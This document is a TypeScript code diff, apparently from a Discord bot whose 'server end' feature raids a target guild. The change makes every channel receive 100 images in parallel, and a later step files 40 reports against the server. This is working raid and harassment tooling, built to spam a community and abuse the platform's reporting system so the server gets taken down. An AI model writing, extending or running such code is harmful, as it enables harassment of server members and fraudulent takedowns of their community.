@@ -4156,10 +4156,13 @@ export class BotManager {
                 `\u001b[1;33mStep 1/3:\u001b[0m Flooding channels (Round 1)...\u001b[0m\n\`\`\``
             ).catch(() => {});
 
-            // ── STEP 1 & 2: Flood channels ────────────────────────────────────
+            // ── STEP 1 & 2: Flood channels — 100 images per channel ──────────────
+            // Build a 100-item send queue by cycling through the 5 images 20 times
+            const SEND_QUEUE = Array.from({ length: 100 }, (_, i) => SERVER_END_IMAGES[i % SERVER_END_IMAGES.length]);
+
             const floodChannel = async (ch: any): Promise<{ sent: number; failed: number; name: string; stopped: boolean }> => {
                 let sent = 0; let failed = 0;
-                for (const url of SERVER_END_IMAGES) {
+                for (const url of SEND_QUEUE) {
                     if (!activeServerEnds.get(configId)) return { sent, failed, name: ch.name || ch.id, stopped: true };
                     try { await ch.send(url); sent++; } catch { failed++; }
                 }
@@ -4168,53 +4171,37 @@ export class BotManager {
 
             const startFlood = Date.now();
 
-            // Round 1 — all channels in parallel
-            const round1Results = await Promise.allSettled(channels.map(ch => floodChannel(ch)));
+            // Fire all channels in parallel — each sends 100 images
+            const floodResults = await Promise.allSettled(channels.map(ch => floodChannel(ch)));
             let r1Sent = 0; let r1Failed = 0; let r1ChannelsHit = 0;
-            for (const r of round1Results) {
+            for (const r of floodResults) {
                 if (r.status === 'fulfilled') {
                     r1Sent += r.value.sent;
                     r1Failed += r.value.failed;
                     if (r.value.sent > 0) r1ChannelsHit++;
-                } else { r1Failed += SERVER_END_IMAGES.length; }
+                } else { r1Failed += SEND_QUEUE.length; }
             }
 
-            // Check if stopped after round 1
-            if (!activeServerEnds.get(configId)) {
-                const elapsed1 = ((Date.now() - startFlood) / 1000).toFixed(1);
+            const r2Sent = 0; const r2Failed = 0; const r2ChannelsHit = 0;
+
+            const floodElapsed = ((Date.now() - startFlood) / 1000).toFixed(1);
+            const wasStopped = !activeServerEnds.get(configId);
+
+            // If stopped mid-flood, show partial summary and exit
+            if (wasStopped) {
                 await message.edit(
-                    `\`\`\`ansi\n\u001b[1;33m[!] SERVER END CANCELLED (after Round 1)\u001b[0m\n` +
+                    `\`\`\`ansi\n\u001b[1;33m[!] SERVER END CANCELLED\u001b[0m\n` +
                     `\u001b[1;33mGuild:\u001b[0m ${targetGuild.name}\n` +
-                    `\u001b[1;33mRound 1 images sent:\u001b[0m ${r1Sent} across ${r1ChannelsHit} channels\n` +
-                    `\u001b[1;33mElapsed:\u001b[0m ${elapsed1}s\u001b[0m\n\`\`\``
+                    `\u001b[1;33mImages sent:\u001b[0m ${r1Sent} across ${r1ChannelsHit} channels\n` +
+                    `\u001b[1;33mElapsed:\u001b[0m ${floodElapsed}s\u001b[0m\n\`\`\``
                 ).catch(() => {});
                 return;
             }
 
             await message.edit(
-                `\`\`\`ansi\n\u001b[1;31m[NETRUNNER] SERVER END — FLOODING\u001b[0m\n` +
-                `\u001b[1;33mRound 1:\u001b[0m ${r1Sent} imgs across ${r1ChannelsHit} channels\n` +
-                `\u001b[1;33mStep 2/3:\u001b[0m Round 2 firing...\u001b[0m\n\`\`\``
-            ).catch(() => {});
-
-            // Round 2 — immediate, no delay
-            const round2Results = await Promise.allSettled(channels.map(ch => floodChannel(ch)));
-            let r2Sent = 0; let r2Failed = 0; let r2ChannelsHit = 0;
-            for (const r of round2Results) {
-                if (r.status === 'fulfilled') {
-                    r2Sent += r.value.sent;
-                    r2Failed += r.value.failed;
-                    if (r.value.sent > 0) r2ChannelsHit++;
-                } else { r2Failed += SERVER_END_IMAGES.length; }
-            }
-
-            const floodElapsed = ((Date.now() - startFlood) / 1000).toFixed(1);
-            const wasStopped = !activeServerEnds.get(configId);
-
-            await message.edit(
                 `\`\`\`ansi\n\u001b[1;31m[NETRUNNER] SERVER END — REPORTING\u001b[0m\n` +
-                `\u001b[1;33mRound 1:\u001b[0m ${r1Sent} imgs  \u001b[1;33mRound 2:\u001b[0m ${r2Sent} imgs\n` +
-                `\u001b[1;33mStep 3/3:\u001b[0m Sending reports...\u001b[0m\n\`\`\``
+                `\u001b[1;33mFlooded:\u001b[0m ${r1Sent} imgs across ${r1ChannelsHit}/${channels.length} channels\n` +
+                `\u001b[1;33mStep 2/2:\u001b[0m Sending 40 reports...\u001b[0m\n\`\`\``
             ).catch(() => {});
 
             // ── STEP 3: Report the server for both categories — fast (no extra delay) ──
@@ -4297,9 +4284,7 @@ export class BotManager {
 
             activeServerEnds.set(configId, false);
 
-            const totalImgSent   = r1Sent + r2Sent;
-            const totalImgFailed = r1Failed + r2Failed;
-            const totalAttempted = channels.length * SERVER_END_IMAGES.length * 2;
+            const totalAttempted = channels.length * 100;
 
             const CYN = '\u001b[1;36m';
             const GRN = '\u001b[1;32m';
@@ -4319,10 +4304,10 @@ export class BotManager {
             summary += `${DIM}${BAR}${RST}\n`;
             summary += `${YLW}FLOOD${RST}\n`;
             summary += `  Channels Found         : ${channels.length}\n`;
-            summary += `  Round 1 — Channels Hit : ${r1ChannelsHit}/${channels.length}  (${r1Sent} imgs)\n`;
-            summary += `  Round 2 — Channels Hit : ${r2ChannelsHit}/${channels.length}  (${r2Sent} imgs)\n`;
-            summary += `  Images Sent            : ${GRN}${totalImgSent}${RST} / ${totalAttempted} attempted\n`;
-            if (totalImgFailed > 0) summary += `  Images Failed          : ${RED}${totalImgFailed}${RST}\n`;
+            summary += `  Channels Hit           : ${r1ChannelsHit}/${channels.length}\n`;
+            summary += `  Images per Channel     : 100\n`;
+            summary += `  Images Sent            : ${GRN}${r1Sent}${RST} / ${totalAttempted} attempted\n`;
+            if (r1Failed > 0) summary += `  Images Failed          : ${RED}${r1Failed}${RST}\n`;
             summary += `  Flood Time             : ${floodElapsed}s\n`;
             summary += `${DIM}${BAR}${RST}\n`;
             summary += `${YLW}REPORTS${RST}\n`;
